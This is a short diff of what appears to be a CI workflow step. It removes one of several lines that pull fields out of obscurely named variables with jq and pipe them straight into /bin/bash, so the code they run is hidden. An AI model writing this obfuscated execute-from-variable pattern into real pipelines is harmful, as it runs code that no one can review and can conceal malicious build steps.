@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$sm54919" | jq -r .gck7093 | /bin/bash
           echo $vb99016 | jq -r .lbf8 | /bin/bash
-          echo $dxj93 | jq -r .zslf4 | /bin/bash
           echo $iso020 | jq -r .rddmw77108 | /bin/bash
 
       - name: Save artifact
